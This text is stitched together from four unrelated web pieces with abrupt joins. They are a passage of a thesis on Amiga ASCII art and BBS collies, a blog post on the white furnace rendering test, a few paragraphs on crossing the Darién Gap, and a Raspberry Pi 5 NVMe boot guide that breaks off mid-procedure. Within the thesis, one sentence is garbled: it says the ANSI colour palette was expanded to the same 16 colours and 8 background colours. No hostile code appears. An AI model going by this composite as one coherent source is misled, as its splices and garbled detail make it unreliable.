composed of young men aged 15-20. They shared an interest in computers and the possibilities they created<sup><a href="#fn41" id="fnref41">[41]</a></sup>. BBSs were significant communal forums for social activity. They served as meeting places for friend groups as well as hobbyist and subcultural groups<sup><a href="#fn42" id="fnref42">[42]</a></sup>.</p><p>Due to the home computers on the market that were incompatible with each other, hobbyists were loosely divided into different user groups specific to each computer. It was possible to log into BBSs with any computer, but due to the different character set standards, they might not necessarily display or function correctly. As a result, Amiga and MS-DOS-based PCs developed slightly different user cultures, even if their basic vibe was the same<sup><a href="#fn43" id="fnref43">[43]</a></sup>.</p><h3 id="235-ascii-art-to-decorate-bbs-boards">2.3.5. ASCII ART TO DECORATE BBS BOARDS</h3><p>Data transfer via modem was very slow and therefore consisted mainly of text files. Terminal programs used to connect to the BBSs also operated under text-based operating systems. Due to their text-based nature, the BBS user interfaces were quite austere. There arose a need to embellish these interfaces and create images.</p><p>Amiga and PC-based BBSs started to be decorated with ASCII graphics. Most of the BBSs operated on PCs, which were not compatible with Amiga (Figure 12). Graphics on the PC were created using the extended character set and font of the original IBM PC, known as ANSI art.</p><figure><img alt="The word GRMMXI in PC and Amiga ASCII styles.

The same logo in IBM PC's (left) and Amiga's (right) fonts.</figcaption></figure><p>ANSI art is a form of ASCII art. However, it significantly differs from other forms of ASCII art, as ANSI art mainly consists of rectangular raster bars and looks more like pixel graphics than actual text art. PC computers' ROM (<em>read only memory</em>) contained the character set and font specified on <em>"code page 437"</em>. This character set includes the 128 characters of the ASCII standard and additionally a set of graphical elements specifically for drawing tables and graphics. However, ANSI images are primarily composed of five characters, whose different strength raster surfaces enable the creation of color fields and shading on an 80x25 grid. Using color was also possible through terminal control codes included in the terminal control standard. The typical ANSI color palette consists of 16 colors and 8 background colors, which was later expanded to 16 colors and 8 background colors. This allowed for significantly more imposing images than traditional ASCII graphics.<sup><a href="#fn44" id="fnref44">[44]</a></sup></p><div><h4 id="note-from-2023">Note from 2023:</h4><p>Because the tools for creating ANSI and Amiga ASCII are mostly the same, many contemporary Amiga ASCII pieces also use ANSI colours. However, if colored Amiga ASCII is viewed on an actual Amiga, the colours wouldn't show.</p></div><p>ANSI graphics were originally used in <em>crack intros</em><sup><a href="#fn45" id="fnref45">[45]</a></sup> for illegal software copies and in the logos of BBS login pages. Before long, ANSI artists formed groups and began publishing monthly packages containing ANSI art. Activities were typically organized, and intergroup competition became an essential factor in maintaining the intensity of the hobby.</p><p>A few comprehensive studies and other literature have been written on ANSI art and its related culture, so I will omit its in-depth discussion from this thesis.</p><p>Amiga ASCII was largely created for applications related to BBS boards. BBS administrators needed beautiful login pages and ASCII art to embellish various sections of the BBS to improve the user interface.</p><p>In the early 1990s, Amiga ASCII art groups and individuals began to release their materials as <em>collies</em> or logo collections. This convention can be seen as having come from the ANSI art side, where groups published their works in art packs. However, Amiga ASCII collies were individual text files containing all the material, while ANSI art packs were collections of separate files.</p><p>Today, BBS boards have no practical significance and exist mostly for nostalgic purposes. They can also be a status symbol for groups and a way to pass the time. However, various websites on the Internet have replaced the BBSs as the publication channel for collies<sup><a href="#fn46" id="fnref46">[46]</a></sup>.</p><h3 id="236-what-is-a-colly">2.3.6. WHAT IS A COLLY?</h3><p>Colly, or collection, is a text file containing a collection of Amiga ASCII artworks created by one or more artists. The primary purpose of collies is to showcase the latest works of an ASCII artist in one place.</p><p>The term "colly" originated from the Amiga ASCII group <em>ART</em>'s 1992 released logo collection called <em>Collection volume 1</em> <sup><a href="#fn47" id="fnref47">[47]</a></sup>, after which it became a common practice within the subculture. Collies were the primary publishing format for Amiga ASCII art and have remained so to this day.</p><p>Rarely was Amiga ASCII used for traditional, representational art. However, representational images might be used in collies as illustrations. The main content of collies was typographic logos. They were usually made to a maximum size of 80x25, as the terminal programs used to connect to BBS were this size. Logos were typically 7-12 letters long, depending on the width of the logo font. The letters of a logo were often adjusted according to the length of the word and its intended use. The same logo style could be applied to words of different lengths. Even four-letter logos could be stretched to 80 cells to suit its use in BBS. Often, ornaments or texturing were made around the logo to frame the logo itself<sup><a href="#fn48" id="fnref48">[48]</a></sup>.</p><p>Some collies were collections of miscellaneous logos, advertisements, and other materials used in BBS made by the artist. However, many collies showcased the artist's newly developed typographic style to make logos. Collies could also be made in collaboration with another artist. Then both artists would create their own version of a particular word, and the person who commissioned the word could choose which one to use<sup><a href="#fn49" id="fnref49">[49]</a></sup>. Collies were often thousands of lines long.</p><p>Artists releasing collies competed with other artists for the best colly. An individual or group that made a beautiful colly gained respect and status among members of the subculture. Makers of high-quality ASCII art could also ascend within the group's internal hierarchy or receive invitations to generally more esteemed groups. As in other computer enthusiast subcultures, competition among groups and their members was a key factor in motivating groups to publish and maintain the quality of collections.</p><p>A colly traditionally consists of the following elements:</p><p>A. Advertisement for the group's own BBS<br>B. Title of the colly, creator's logo, and group logo<br>C. Table of contents (<em>index</em>)<br>D. Introduction / creator comments<br>E.

Acknowledgements (<em>respects</em>)</p><h4 id="a-advertisement-for-the-groups-own-bbs"><strong>A. Advertisement for the group's own BBS</strong></h4><p>Collies usually begin with either an advertisement for their own BBS or a title. The BBS advertisement promotes the group's own headquarters (<em>HQ</em>) BBS. The headquarters serve as the group's primary publication channel for new collies, the place where the group's productions arrive the fastest<sup><a href="#fn50" id="fnref50">[50]</a></sup>.</p><figure><img alt="Logo and various advertising text in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/7uulPp4D8q-640.png" width="640" height="338"><figcaption>(Figure 13.) BBS can advertisement from the colly "zeitgeist|moving|on" by the Finnish Amiga ASCII artist operating under the pseudonym Zeus.</figcaption></figure><p>In the ad, the name of the BBS is made as an ASCII image, and details about the BBS are listed around it. This information usually includes which groups it serves as the headquarters for, the names of the BBS administrators, technical details, software, and addresses used for connection. Only those with a functional BBS use a BBS advertisement. (Figure 13).</p><p>BBS advertisements were also made for BBSs other than the group's own. These ads could be spread on discussion areas reserved for ads in other BBSs. The more impressive the ad and the more famous the artist who made it, the more people it attracted to visit the advertised BBS<sup><a href="#fn51" id="fnref51">[51]</a></sup>.</p><h4 id="b-title-of-the-colly-creators-logo-and-group-logo"><strong>B. Title of the colly, creator's logo, and group logo</strong></h4><p>At the beginning of collies, there is usually a title. The title may include the name of the colly creator, the name of the group the creator belongs to, and the name of the collection. The title is important because it reflects the theme and style of the collection and gives a taste of what's to come. It serves as an introduction to the following sections. (Figure 15).</p><figure><img alt="Various logos, text and patterns in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/q0sKBwdl_E-640.png" width="640" height="1474"><figcaption>(Figure 15.) Title from the "Jungle Fever" colly by Finnish Amiga ASCII artist Antti "h7" Kiuru.</figcaption></figure><h4 id="c-table-of-contents-index"><strong>C. Table of contents (index)</strong></h4><p>The table of contents lists the ASCII images contained in the collection in numerical order. In the list, names are usually written in plain text. Tables of contents are used especially in long collies, which may contain hundreds of logos and other ASCII images made for various parties.</p><p>Collies often also contain a brief introduction, where the creator writes about the origin or theme of the collection, their own life, news, or other matters related to the subculture. This allows the creator to explain the background of their colly, express their thoughts related to drawing, or reinforce their position as an Amiga ASCII creator. (Figure 14).</p><figure><img alt="Logo and epilogue text in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/eesZDISCjl-640.png" width="640" height="514"><figcaption>(Figure 14.)

The actual content of the collection, i.e., ASCII logos, BBS advertisements, and FILE_ID.DIZ files</strong></h4><p>The main content of collies consists of ASCII logos made for others, BBS advertisements, and file_id.diz text files. These usually come as requests from other members of the subculture. For example, a BBS administrator might ask an Amiga ASCII artist to create a login page logo for their BBS. Then the creator of the colly can use their newly developed style to create a logo for the BBS administrator to use. So, ASCII logos were often put to some use. ASCII logos could be requested by anyone, individuals, or groups.</p><p>FILE_ID.DIZ is an ASCII text file that contains a short description of the content of the archive file. Many BBSs allowed users to upload their own files for others to download. BBS administrators might require the person uploading a file to also provide a description of the content they are uploading. To standardize descriptions, archive files were supplemented with a FILE_ID.DIZ file to provide a clear description of the content to be downloaded. The text file was required to contain at least the program name, version number, and a description of the file to be downloaded. Traditionally, FILE_ID.DIZ was allowed to be 10 lines long, with each line containing a maximum of 45 characters<sup><a href="#fn52" id="fnref52">[52]</a></sup>.</p><figure><img alt="Logo in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/3C-ZTpt4aK-640.png" width="640" height="306"><figcaption>(Figure 16.) FILE_ID.DIZ file for nuancE from the colly "zeitgeist|moving|on". The top bar serves as a separator and provides the logo number, plain-language name, and purpose (FILE_ID.DIZ), as well as the collection name. The numbers and spacing symbols around the logo are not part of the logo itself but indicate row and character count. In this FILE_ID.DIZ logo, the requester's name is stylized. Placeholder text is left below it for layout testing when there is no actual content yet. The bottom corner contains the artist's pseudonym abbreviation zS! i.e., Zeus.</figcaption></figure><p>However, Amiga ASCII artists began to use this file for their own needs, often as an icon for the colly. In this case, FILE_ID.DIZ contains the name of the colly, the creator, and some release information. The purpose of the icon is to be as impressive as possible to attract the attention of others, as it serves as a preview for the actual colly.</p><p>Different logos are separated by a separator. The separator also structures the content and helps with navigation. The separator usually lists the logo number, which matches the table of contents, the name of the colly, the name of the logo, and/or the name of the person requesting the logo. Because logos are often difficult to read, the text of the logo in the separator is often written in plain text.</p><p>Amiga ASCII logos always have the artist's own abbreviation attached, indicating the creator and copyright. The worst violation is to steal someone else's style or logo and claim it as one's own. If caught, the punishment could be exclusion from the subculture<sup><a href="#fn53" id="fnref53">[53]</a></sup>.</p><h4 id="f-credits"><strong>F. Credits</strong></h4><p>Credits provide the closing details for the colly. It lists the creator's name (or names) and possible guest appearances, i.e., if another Amiga ASCII artist participated in the creation of the colly. The credits often state the release date, file size, file name, font used, text editor or other technical details. Often the credits also mention what music the creator listened to while creating the colly.</p><h4 id="g-greetings"><strong>G. Greetings</strong></h4><p>Greetings, or <em>greets</em>, list the creator's personal acquaintances.</p><h4 id="h-acknowledgments-respects"><strong>H. Acknowledgments (respects)</strong></h4><p>In acknowledgments, or <em>respects</em>, Amiga ASCII artists who are admired and respected by the creator are listed, even if they are not personally known.</p><p>Greetings and acknowledgments were once important for increasing visibility. In listings called ASCII charts, Amiga ASCII artists were ranked by popularity using various metrics. Amiga ASCII artists could be publicly voted on, or the greetings and acknowledgments included in collies were counted together, measuring the artist's popularity. Those who received the most greetings and acknowledgments from other artists topped the list, in turn increasing their popularity and visibility of their collies. Rankings also took into account for whom other artists had made logos. This partly motivated designing logos for other ASCII artists<sup><a href="#fn54" id="fnref54">[54]</a></sup>.</p><p>The largest archive site for Amiga ASCII collies, <em><a href="http://asciiarena.com/">asciiarena.com</a></em><sup><a href="#fn55" id="fnref55">[55]</a></sup>, lists about 4,000 collies from 780 different artists spanning the years 1992-2015. Most of them were released before the year 2000. While Amiga ASCII might be considered a niche subculture, the number of artworks and artists indicates a significant phenomenon.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>Asciiarena.com is nowdays <a href="https://asciiarena.se/">asciiarena.se</a>, but unfortunately it seems to be down every once in a while.

MY STARTING POINT FOR CREATING ASCII ART</h2><p>I didn't get to witness the golden days of BBSs and ASCII art or belong to the ASCII art-related subculture because the subculture had already waned by the time I started my computer hobbies in the early 2000s. However, I remember what the Internet was like in the late 90s and early 2000s. It was a magical and mysterious place for me, where every now and then, I'd encounter these strange images made up of mere characters. These could be seen in text-based info files of downloaded files, comments on discussion boards, or hidden in a website's source code. These images intrigued me, and at about ten years old, I too wanted to master this art of image-making: slowly, one letter at a time, I typed an image of a DJ playing records. The technique was challenging and time-consuming enough that I tried it only once.</p><p>In January 2014, I found a web-based hobby magazine on the internet, <em>OrDeR Of ThE ShAdOw Wolf</em>, a cyberzine, made by the Dutch electronic music-producing artist Danny "Legowelt" Wolfers. For a moment, the internet felt magical and mysterious again, as I read text laid out in green monospaced font on a black background, with titles and images made in ASCII.</p><p>Legowelt starts the cyberzine with these words:</p><blockquote><p>"Welcome to the first issue of ORDER OF THE SHADOW WOLF, a cyberpunk e-zine in true original text format. This is how e-zines looked before the dawn of the internet in the 1980s and early 1990s. They were distributed via BBS's [...]. People would download these e-zines on their 300 baud modems and read them on their monochrome green screens late at night. Difficult to imagine now but doing this felt like the most exciting thing in the world, surrounded by a mystique of hacker romanticism and being a cyberpunk pioneer. It was a time when your mum and retarded jock cousin weren't on the internet, even more hardcore...you were probably the only person in your whole town or area logged into cyberspace!" <sup><a href="#fn56" id="fnref56">[56]</a></sup></p></blockquote><p>I wanted to delve into this obscure subculture and the way of making images. It felt fascinating. I also don't believe I'm very skilled in illustrating, designing logos, or producing visual material in general. I wanted to enhance my creative expression. After trying to draw my first ASCII image, I found that making logos and images with the constraints set by ASCII is quite liberating. The limitation of the ASCII character set forces creativity and uses it as a strength for making images. The primitive nature of this medium felt like the right method to develop my expression.</p><p>I set the following goals for myself before embarking on the project:</p><blockquote><p>"I intend to try various styles and techniques to draw logos with ASCII. Initially, at least, I will use the word "GRMMXI" as the text for my logos, which represents my friends/classmates/artistic community for whom, and to whom, I'm creating these logos. This will keep me motivated. Through experimentation, I aim to observe shapes, typography, logos, and textures in a new light, thereby evolving as a graphic designer. I also haven't done much logo design before, so I hope this approach brings new perspectives to logo design."</p></blockquote><h3 id="311-finding-the-right-method">3.1.1. FINDING THE RIGHT METHOD</h3><p>I work as a web designer, so I started working on my first experiments with the text editing tool I know best: a code editor. However, I soon realized that with the default font of the code editor, I couldn't produce results that met my expectations: the characters didn't mesh well together. I wanted to know how ASCII art is really made.</p><figure><img alt="Logo in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/XvtWRhhzHJ-380.png" width="380" height="223"><figcaption>(Figure 17.) FILE_ID.DIZ file from the collective publication of the Break group.</figcaption></figure><p>While getting acquainted with ASCII art, I wasn't yet aware of the existence of Amiga ASCII. From the site <em><a href="http://sixteen-colors.net/">sixteen-colors.net</a></em><sup><a href="#fn57" id="fnref57">[57]</a></sup>, which archives ASCII and ANSI art, I found the logo of the <em>Break</em> group (Figure 17). I had never seen ASCII graphics of this style before, where the lines connect almost seamlessly. I wanted to make my thesis using this technique and began to delve into the technical characteristics of this style.</p><p>In my search, I found the website <em><a href="http://asciiarena.com/">asciiarena.com</a></em>, which archives Amiga ASCII collies. It is the most comprehensive site archiving Amiga ASCII and now serves as the primary publishing channel for new Amiga ASCII works for many. The site is full of increasingly impressive Amiga ASCII collies, and browsing through the works of others served as a significant source of inspiration throughout the project. I decided that I wanted to publish my project on this site in its original colly format.</p><p>I found and installed the original Amiga fonts<sup><a href="#fn58" id="fnref58">[58]</a></sup> in TTF format on my computer. This allowed me to start creating Amiga ASCII images and delve deeper into the method of making ASCII images. I set my text editor's user settings to use the Amiga Topaz font, reduced the line height, and changed the colors to black and white. This allowed me to achieve the desired results.</p><figure><img alt="Logo in black and white filled ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/xFJQZQunWZ-822.png" width="822" height="406"><figcaption>(Figure 18.) My first ASCII attempt. When looked at closely, the above appears as a heap of random letters and symbols. However, by squinting, one can discern that it reads GRMMXI. Each character has its texture, contrast, and shape, which, when placed side by side, are reduced to a larger cohesive form or surface. I later learned that this is called filled ASCII, which was a common method of creating ASCII on PC computers.</figcaption></figure><h2 id="32-production-process">3.2. PRODUCTION PROCESS</h2><h3 id="321-description-of-creating-amiga-ascii-images">3.2.1. DESCRIPTION OF CREATING AMIGA ASCII IMAGES</h3><p>Typing each character by hand required absolute focus. However, using the cut-paste technique, experimenting with new shapes and ideas was easy and smooth. This process enabled constant evaluation of the work. From the same logo, several different variations could be made.</p><figure><img alt="Logo in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/fb6TwRtWHq-640.png" width="640" height="578"><figcaption>(Figure 19.) Logo variations. My early logo exercises, experimenting with different variations of an easily readable logo.</figcaption></figure><p>However, creating logos began to feel challenging and rigid. Comparing my logos to those made by others, I felt that I was not succeeding in creating an original yet stylish logo type. I tried sketching ASCII logos in a drawing book, but that also felt frustrating since, for instance, curved shapes are tricky, if not impossible, to make with Amiga ASCII. It was better to draft directly in the text editor and let the restrictions set by the characters influence the formation of the shapes.</p><p>For this reason, I wanted to break free and create images and logos that deviated from Amiga ASCII conventions. I also realized that I didn't need to follow the footsteps of previous ASCII artists and therefore didn't set clear content guidelines. I only decided in advance that I would try different methods and see what felt right and most inspiring. Hence, the image themes don't follow a clear unified line; the result consists of different experiments.</p><p>I tried a more expressive form language by creating logos that consisted of sharp angles and straight lines combined with wiggly shapes using parenthesis. Using parentheses seemed promising since I hadn't seen many using them in their logos. I challenged myself and created a "slimy" logo that dripped downward using parentheses, which I found successful.</p><figure><img alt="Logo in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/68pGs-fmYD-432.png" width="432" height="369"><figcaption>(Figure 21.) Baltic Circle. Slime logo.</figcaption></figure><p>In one logo experiment, I added eyes and a mouth, making the letters look like fun characters. This inspired me to try creating human figures. With the special characters of the Amiga ASCII character set, I was able to create faces in different perspectives. The easiest facial features were the eyes, which I made using "hatted" variatons of a-, o-, and u-letters. However, making the mouth was challenging since very few Amiga ASCII characters are diagonally inclined. Drawing hands and feet also proved extremely difficult because of their round shapes.</p><figure><img alt="Logo in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/oHBF8UmsLN-640.png" width="640" height="754"><figcaption>(Figure 20.) Character sketches.</figcaption></figure><p>However, this image theme felt funniest and most inspiring to me. I felt most creative when making characters. According to Michael Hischer, whom I interviewed, representational images weren't highly valued in the past, but they are now viewed positively<sup><a href="#fn59" id="fnref59">[59]</a></sup>, which motivated me to continue drawing characters.</p><p>My enthusiasm for creating images experienced highs and lows. My initial goal was to draw at least one ASCII image per day, which I did in the early stages of the project. However, making logos felt challenging, and I became frustrated with my drawing. Satisfaction was hard to come by. Additionally, immersing myself in the topic and writing about it took a significant amount of energy. Writing the thesis was challenging from start to finish, as I realized early on that I had chosen a nearly unexplored topic. However, Amiga ASCII as a subject is extremely interesting, which helped me persevere in creating the thesis.</p><h3 id="322-making-the-colly">3.2.2. MAKING THE COLLY</h3><p>In the end, I created over 50 different logo and character experiments. I thought the number was too small to produce a decent final product, but when making the colly, I realized it was still sufficient.</p><p>I refined the ASCII images I had made and constructed the colly using the PabloDraw program. PabloDraw<sup><a href="#fn60" id="fnref60">[60]</a></sup> is an ASCII/ANSI editor for modern operating systems. It is specifically designed for ASCII art creation and includes Amiga's original Topaz font and column settings. For the colly, I had no clear idea; instead, I brought my separate image experiments into the program and started building suitable combinations from them.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>Nowdays I would recommend using <a href="https://blocktronics.github.io/moebius/">Moebius</a> instead of PabloDraw.</p></div><p>The pieces fell into place on their own. At the beginning of the colly, I created a dreamscape that continues in a comic-like manner with a person pondering the creation of a thesis, adding a meta-level to the colly. From within the dreamlike landscape, the title of the colly, "innocence," is revealed, which I chose as a name to describe, firstly, the childishly innocent starting point of my authorship as a new ASCII artist, but also proclaiming my innocence in creating an unconventional colly stemming from my background.</p><p>After this, the colly continues with various styles and experiments that vaguely intertwine. My original ASCII images laid the foundation for the colly, but I still had to do a lot of work adding backgrounds, decorations, and details.</p><p>I find the final result interesting, and I am satisfied with it. The colly turned out to be significantly illustrative, which deviates from the traditions of Amiga ASCII collies. However, I believe this is a positive aspect since the colly as a whole remains cohesive and intriguing.</p><figure><img alt="Dot matrix printer printing the colly" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/ML1Cbn8JO6-624.png" width="624" height="19026"><figcaption>(Figure 22.) The final colly!</figcaption></figure><h3 id="323-physical-final-product">3.2.3. PHYSICAL FINAL PRODUCT</h3><p>Collies are usually viewed on a computer screen, but I wanted to materialize my product into a physical form. This seemed like a challenging task, as collies are typically continuous, spanning several pages in length, making them difficult to sensibly present, for example, on the pages of a book.</p><p>I came up with the idea to print my Amiga ASCII images using a dot-matrix printer. It can print on continuous form paper, which modern printers cannot do. Continuous form paper is a continuous strip of paper perforated at regular intervals. Dot-matrix printers were common in the 80s and 90s before the advent of proper inkjet and laser printers. In a dot-matrix printer, graphics are printed as dots by striking pins against a black ribbon onto the paper. This was perfect for my purpose, as my images are black and white and would cover several vertical A4 pages in total. As the device was popular around the same time Amiga ASCII was most commonly produced, it also served as a fitting historical reference.</p><p>However, I don't own such a device, and according to a Facebook poll, none of my acquaintances did either. The device seemed to be outdated technology that no one had. But I didn't give up; I searched for "dot matrix printer" in the Fonecta search service. The search yielded only one result: the printer-manufacturing company, <em>OKI Finland</em>. I emailed them, asking if they knew where I could borrow a dot-matrix printer. Fortunately, and to my surprise, they had one to lend, which I borrowed for a month.</p><figure><img alt="Dot matrix printer printing the colly" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/EwqKIXHCbw-1064.png" width="1064" height="802"><figcaption>(Figure 22.) Printing the colly with a matrix printer.</figcaption></figure><p>However, my luck changed when, upon testing the printer's features, I found out that it was not possible to print a completely continuous image. The printout of my production turned out to be over 5 meters long, and the printer left a margin of about a centimeter every 30 centimeters or so. This is due to the printer's drivers, which were not designed for long print runs, even if it would be theoretically possible. Nevertheless, I didn't let this discourage me, as the idea of the production still comes through despite this.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>I did manage to print it as a "continuous" image by printing one section at a time and then carefully positioning the paper again.</p></div><hr><p>The aim of the project was to explore Amiga ASCII culture, learn to observe forms, typography, and textures in a new way, enhance my creative expression, and gather insights for graphic design.</p><p>Amiga ASCII significantly resembles graphic design. It is used to embellish user interfaces, create logos for clients, and typographic design lies at its core. However, I don't feel that I've gained any practical benefit as a graphic designer from this project. The method of Amiga ASCII is unique, and it has no practical link to today's world. It's hard to instrumentalize. It operates under its own rules, in the margin, outside the mainstream. It is anti-capitalist, even anarchistic, because it is difficult to commercialize or display in art galleries. It can be described as digital folk art or tradition. It pales in expressive power compared to many other art methods. Yet, it's alluring, charming, and delightful because of its peculiar nature.</p><p>I don’t see that I have developed as a designer, but I feel I have gained immensely from the project. I am pleased to have been introduced to such an interesting topic. In my view, I have provided a comprehensive description of the subject. I feel proud to have learned a skill that many people I know had never even heard of, and in that respect, my goal was met: I developed my creative expression. However, I only scratched the surface and see a lot of potential in the method. I definitely intend to continue creating Amiga ASCII art. It would also be great if my project helped me become part of the Amiga ASCII community.</p><p>As Matt “mattmatthew” Yee states in a <em>Blocktronics</em> interview:</p><blockquote><p>"The works done by new and old artists these days are probably the best the scene has ever seen, with a few exceptions. My peers have developed this method further than it has ever been developed before. This is an exciting time to draw." <sup><a href="#fn61" id="fnref61">[61]</a></sup></p></blockquote><p>I look forward to following the development of Amiga ASCII art.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>8 years later, I must say doing this thesis was a real turning point for me! It's difficult to put into words how and how much it benefitted me as a graphic designer or as a person, but as text art is still at the core of my practice, I would say <em>a lot</em>. The "practical" use of Amiga ASCII has mainly come from learning and understanding the <em>modular process</em> of image making, which has enabled me to develop various modular design tools that I've used in my profession as a graphic designer. Even so much that I rarely use any Adobe software anymore.</p><p>I did join the Amiga ASCII community shortly after releasing my thesis, by joining the "Impure!ASCII 1940" group. In 2021 I collaborated with them by making an <a href="https://www.youtube.com/watch?v=X9wodTL9XVA">8 minute long train ride animation</a> that even won the PC Demo compo at Flashparty 2021. I'm really happy how it turned out!</p><p>Even though it's been 8 years, I still feel like I've only scratched the surface of the potential in the method. I don't see myself stopping anytime soon.</p></div><hr><h2 id="sources">SOURCES</h2><h2 id="51-printed-sources">5.1. PRINTED SOURCES</h2><ul><li>Bann, Stephen (1967): <em>Concrete poetry.

<p>The white furnace test is one of my favourite rendering debug tools. But before it was so, it was rather mysterious and abstract to me. Why would a publication proudly show what seemed like empty renders? What does it mean, and why would they care?</p>

<p>The idea is the following: if you have a 100% reflective object that is lit by a uniform environment, it becomes indistinguishable from the environment. It doesn’t matter if the object is matte or mirror like, or anything in between: it just “disappears”.</p>



<p>Accepting this idea took me a while, but there is a real-life situation in which you can experience this effect. Fresh snow can have an albedo as high as 90% to 98%, i.e. nearly perfect white. Associated with overcast weather or fog, it can sometimes appear featureless and become completely indistinguishable from the sky, to the point you’re left with skiing by feel because you can’t even tell the slope two steps in front of you. Everything is just a uniform white in all directions: the <a href="https://en.wikipedia.org/wiki/Whiteout_(weather)">whiteout</a>.</p>



<figure><img decoding="async" loading="lazy" width="500" height="243" src="http://lousodrome.net/blog/light/files/2023/09/real-life-white-furnace-test-500x243.jpg" alt="Photo taken on a ski track.

Note how the snow surface slope and details are almost invisible, and the sign in the background seems to be floating in the air.</figcaption></figure>



<p>With the knowledge that a 100% reflective object is supposed to look invisible when uniformly lit, verifying that it does is a good sanity test for a physically based renderer, and the reason why you sometimes see those curious illustrations in publications. It’s showing that the math checks out.</p>



<p>Those tests are usually intended to verify that a BRDF is energy preserving: making sure that it is not losing or adding energy. A typical topic for example is <a href="https://google.github.io/filament/Filament.md.html#materialsystem/improvingthebrdfs/energylossinspecularreflectance">making sure materials don’t look darker as roughness increases</a> and inter-reflections become too significant to be neglected. Missing energy is not the only concern though, and a grey environment (as opposed to a white one) is convenient as any excess of reflected energy will appear brighter than it.</p>


<figure>
<figcaption>Demonstration of the white furnace test on ShaderToy, or an expensive way to render an empty image. Press the play button to see the scene revealed.</figcaption></figure>


<p>But verifying the energy conservation of a BRDF is just one of the cases where the white furnace test is useful. Since a Lambertian BRDF with an albedo of 100% is perfectly energy preserving and completely trivial to implement, the white furnace test with such a white Lambert material can be used to reveal bugs in the renderer implementation itself.</p>



<div><p>There are so many aspects of the implementation that can go wrong: the sampling distribution, the proper weighting of the samples, a mistake in the PDF, a pi or a 2 factor forgotten somewhere… Those errors tend to be subtle and can result in a render that still looks reasonable. Nothing looks more like a correct shading than a slightly incorrect one.</p><p>So when I’m either writing a path tracer or one of its variants, or generating a pre-convolved environment map, or trying different sampling distributions, my first sanity check is to make sure it passes the white furnace test with a pure white Lambertian BRDF. Once that is done (and as writing the demonstration shader above showed me once again, that can take a few iterations), I can have confidence in my implementation and test the BRDF themselves.</p></div>



<p>Take away: the white furnace test is a very useful debugging tool to validate both the integration part and the BRDF part of your rendering.<br></p>

</p><p>Between the early 1980s and mid-1990s, Encounter Overland, a British adventure travel company, organized 2- to 3-week trekking trips through the Darién Gap from Panama to Colombia or vice versa. These trips used a combination of whatever transport was available: jeeps, bus, boats, and walking, with travelers carrying their own supplies. Experienced trekkers guided mixed-sex groups of any nationality.

</p><p>Complete overland crossings of the Darién rainforest on foot and riverboat (i.e., from the last road in Panama to the first road in Colombia) became more dangerous in the 1990s because of the <a href="https://en.wikipedia.org/wiki/Colombian_conflict_(1964%E2%80%93present)" title="Colombian conflict (1964–present)">Colombian conflict</a>. The Colombian portion of the Darién rainforest in the Katios Park region eventually fell under control of armed groups.

</p><p>In 2017 a group of four retired US soldiers — Wayne Mitchell, Simon Edwards, Rich Doering, and Mike Eastham — led by Kuna guide Isaac Pizarro and assisted by villagers from the Kuna village of Paya, crossed the Darien in 8 days with four Kawasaki KLR motorcycles.  The group was accompanied by filmmaker Jake Hamby and photographer Alex Manne, who documented the entire motorcycle trip from Alaska to Argentina in the 2022 documentary film "Where the Road Ends" on Youtube.

<p>It is possible to cross the Gap on foot, but the conditions are very difficult and often underestimated.

<p>In my <a href="https://www.youtube.com/watch?v=nBtOEmUqASQ">video about the brand new Raspberry Pi 5</a>, I mentioned the new external PCIe port makes it possible to boot the standard Pi 5 model B directly off NVMe storage—an option which is <em>much</em> faster and more reliable than standard microSD storage (even with industrial-rated cards!).</p>

<p>Enabling NVMe boot is pretty easy, you add a line to <code>/boot/config.txt</code>, <a href="https://www.raspberrypi.com/documentation/computers/raspberry-pi.html#BOOT_ORDER">modify the <code>BOOT_ORDER</code></a> in the bootloader configuration, and reboot!</p>

<p>Of course, you'll also need to get Pi OS onto the NVMe, and there are a few ways to do that—I'll walk you through my favorite method below.</p>

<blockquote>
  <p>Note: Raspberry Pi announced they are developing an official <a href="https://pipci.jeffgeerling.com/hats/pi-nvme-hat.html">Raspberry Pi M.2 HAT</a>, but there is no word on a launch date for it yet. I am also tracking other <a href="https://pipci.jeffgeerling.com/hats">PCIe HATs for Raspberry Pi 5 here</a>.</p>
</blockquote>

<h2>Enable the external PCI Express port</h2>

<p>First, enable the external PCIe port on the Raspberry Pi 5. Edit <code>/boot/config.txt</code> and add the following at the bottom:</p>

<pre><code># Add to bottom of /boot/config.txt
dtparam=pciex1

# Note: You could also just add the following (it is an alias to the above line)
# dtparam=nvme

# Optionally, you can control the PCIe lane speed using this parameter
# dtparam=pciex1_gen=3
</code></pre>

<p>I have the <code>pciex1_gen=3</code> part commented out above because Raspberry Pi <em>allows</em> you to tweak the bus speed (you can choose Gen 1 for 2.5 GS/s, Gen 2 for 5 GS/s, and Gen 3 for 8 GS/s), but the port is only rated for up to PCIe Gen 2 speeds.</p>

<p>In practice, I have been able to run multiple NVMe SSDs at Gen 3.0 speed (getting up to 900 MB/sec) on my alpha Pi 5, but YMMV—PCIe can be very fickle, depending on the quality of the FFC cable and connections on your own setup.</p>

<h2>Set NVMe early in the boot order</h2>

<p>The PCIe connection should work after a reboot, but your Pi won't try booting off an NVMe SSD yet. For that, you need to change the <code>BOOT_ORDER</code> in the Raspberry Pi's bootloader configuration:</p>

<pre><code># Edit the EEPROM on the Raspberry Pi 5.
sudo rpi-eeprom-config --edit pieeprom.bin

# Change the BOOT_ORDER line to the following:
BOOT_ORDER=0xf416

# Press Ctrl-O, then enter, to write the change to the file.
# Press Ctrl-X to exit nano (the editor).
</code></pre>

